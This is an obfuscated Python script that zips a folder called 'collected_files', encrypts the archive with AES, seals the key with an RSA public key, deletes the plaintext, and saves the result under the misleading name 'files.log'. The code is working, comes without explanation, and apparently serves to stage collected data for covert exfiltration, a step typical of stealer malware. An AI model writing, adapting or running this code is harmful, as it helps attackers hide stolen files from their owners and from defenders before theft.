import os as o, zipfile as z, shutil as s
from Crypto.Cipher import AES as A
from Crypto.Random import get_random_bytes as g
from Crypto.Util.Padding import pad as p
from Crypto.PublicKey import RSA as R
from Crypto.Cipher import PKCS1_OAEP as P

def x(a, b):
    with z.ZipFile(b, 'w', z.ZIP_DEFLATED) as zf:
        for r, _, fs in o.walk(a):
            for f in fs:
                fp = o.path.join(r, f)
                an = o.path.relpath(fp, a)
                zf.write(fp, an)

def y(i, o_, k):
    c = A.new(k, A.MODE_CBC)
    v = c.iv
    with open(i, 'rb') as f: d = f.read()
    with open(o_, 'wb') as f: f.write(v + c.encrypt(p(d, A.block_size)))

def k(a, b):
    with open(b, "rb") as f: r = R.import_key(f.read())
    c = P.new(r)
    with open("key.bin", "wb") as f: f.write(c.encrypt(a))

if __name__ == "__main__":
    x("collected_files", "tmp.zip")
    k1 = g(16)
    y("tmp.zip", "files.log", k1)
    k(k1, "rsa_public.pem")
    o.remove("tmp.zip")
    print("✔ Encrypted & saved as files.log")
